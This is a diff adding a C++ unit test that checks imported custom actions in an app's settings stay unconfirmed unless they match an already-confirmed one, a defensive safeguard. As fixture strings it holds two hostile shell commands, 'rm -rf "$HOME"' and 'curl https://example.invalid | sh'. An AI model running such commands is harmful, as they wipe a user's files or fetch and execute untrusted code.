@@ -1,4 +1,5 @@
 // SPDX-License-Identifier: GPL-3.0-or-later
+#include "core/CustomActions.h"
 #include "core/InputBindings.h"
 #include "core/Platform.h"
 #include "core/Settings.h"
@@ -207,6 +208,45 @@ void writeFile(const QString& path, const QByteArray& data) {
     f.write(data);
 }
 } // namespace
+
+// F-FILE-10 / F-SET-03: an imported custom action is never "confirmed" - its command is
+// asked before the first run, unless exactly this action (id, kind, command) was already
+// confirmed here.
+TEST_F(SettingsTest, F_FILE_10_ImportedCustomActionsNeedConfirmation) {
+    CustomAction known;
+    known.id = QStringLiteral("known");
+    known.name = QStringLiteral("Bekannt");
+    known.command = QStringLiteral("echo \"$1\"");
+    known.confirmed = true;
+    customactions::save({known});
+
+    CustomAction changed = known;
+    changed.command = QStringLiteral("rm -rf \"$HOME\"");
+    CustomAction foreign;
+    foreign.id = QStringLiteral("foreign");
+    foreign.name = QStringLiteral("Fremd");
+    foreign.command = QStringLiteral("curl https://example.invalid | sh");
+    foreign.confirmed = true;
+    CustomAction same = known; // identical to the confirmed one here
+    same.id = QStringLiteral("known");
+
+    for (const auto& [imported, expectConfirmed] :
+         std::vector<std::pair<CustomAction, bool>>{{changed, false}, {foreign, false}, {same, true}}) {
+        QJsonObject settings;
+        settings.insert(QString::fromLatin1(key::CustomActions), customactions::toJson({imported}));
+        QJsonObject root;
+        root.insert(QStringLiteral("format"), QStringLiteral("lumaflip-settings"));
+        root.insert(QStringLiteral("version"), 1);
+        root.insert(QStringLiteral("settings"), settings);
+        customactions::save({known});
+        QString err;
+        ASSERT_TRUE(s().importData(QJsonDocument(root).toJson(), &err)) << err.toStdString();
+        const QList<CustomAction> now = customactions::load();
+        ASSERT_EQ(now.size(), 1);
+        EXPECT_EQ(now.first().command, imported.command);
+        EXPECT_EQ(now.first().confirmed, expectConfirmed) << imported.command.toStdString();
+    }
+}
 
 // F-SET-03
 TEST_F(SettingsTest, F_SET_03_ImportRejectsInvalidFiles) {
